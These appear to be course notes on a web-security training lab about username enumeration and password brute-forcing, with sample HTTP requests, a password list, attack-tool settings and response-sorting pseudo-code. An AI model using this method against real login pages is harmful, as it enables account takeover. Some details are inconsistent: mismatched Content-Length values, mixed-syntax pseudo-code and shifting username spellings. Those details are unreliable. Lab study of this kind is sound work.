---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Detailed Explanation of the Lab

Let's delve into the specific steps outlined in the lecture transcript and expand on them to provide a comprehensive understanding.

### Step 1: Identify a Valid Username

The first step is to identify a valid username. In the lecture, the username "alaska" is suggested as a potential valid username. To confirm this, you would typically send a login request with this username and observe the server's response.

#### Full HTTP Request and Response

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

username=alaska&password=test
```

```http
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1024

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <p>Invalid username or password.</p>
</body>
</html>
```

In this example, the server responds with a `200 OK` status code and an HTML body indicating that the username or password is invalid. However, if the username is valid, the server might take longer to respond due to additional processing.

### Step 2: Prepare for Brute-Force Password Attempts

Once you have confirmed a valid username, the next step is to prepare for brute-force password attempts. This involves creating a list of potential passwords and configuring the attack tool to send these passwords to the server.

#### Payload Configuration

```plaintext
# Payload file (payload.txt)
test
password
123456
qwerty
letmein
...
```

#### Attack Tool Configuration

```plaintext
# Attack tool configuration
Target URL: http://example.com/login
Username: alaska
Password List: payload.txt
Start Attack
```

### Step 3: Analyze Server Responses

During the attack, you need to analyze the server's responses to identify successful logins. The key indicator is the HTTP status code. A successful login typically results in a `302 Found` status code, indicating a redirection to the account page.

#### Full HTTP Request and Response

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

username=alaska&password=password
```

```http
HTTP/1.1 302 Found
Date: Tue, 14 Mar 2023 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Location: /account
Content-Length: 0
```

In this example, the server responds with a `302 Found` status code and a `Location` header pointing to the account page, indicating a successful login.

### Step 4: Handle Errors and Adjustments

If the attack does not yield the expected results, you may need to adjust your approach. Common issues include incorrect username spelling, incorrect payload configuration, or server-side rate limiting.

#### Error Handling

```plaintext
# Error handling
if (response.status_code == 200) {
    print("Invalid username or password.")
} else if (response.status_code == 302) {
    print("Successful login!")
} else {
    print("Unexpected response:", response.status_code)
}
```

### Step 5: Sort and Analyze Results

After completing the attack, you should sort and analyze the results to identify successful logins. This involves sorting the responses based on the status code and examining the timing differences.

#### Sorting Responses

```plaintext
# Sorting responses
sorted_responses = sorted(responses, key=lambda x: x['time'])
for response in sorted_responses:
    print(response['username'], response['password'], response['status_code'], response['time'])
```

### Step 6: Correct Spelling Mistakes

If the attack fails due to spelling mistakes, you should correct them and retry the attack. In the lecture, the username "Alexa" was mistakenly used instead of "Alaska".

#### Corrected Username

```plaintext
# Corrected username
username = "Alaska"
```

---
<!-- nav -->
[[03-Authentication Vulnerabilities Username Enumeration via Response Timing|Authentication Vulnerabilities Username Enumeration via Response Timing]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/06-Lab 5 Username enumeration via response timing/00-Overview|Overview]] | [[05-How to Prevent  Defend Against Username Enumeration|How to Prevent  Defend Against Username Enumeration]]
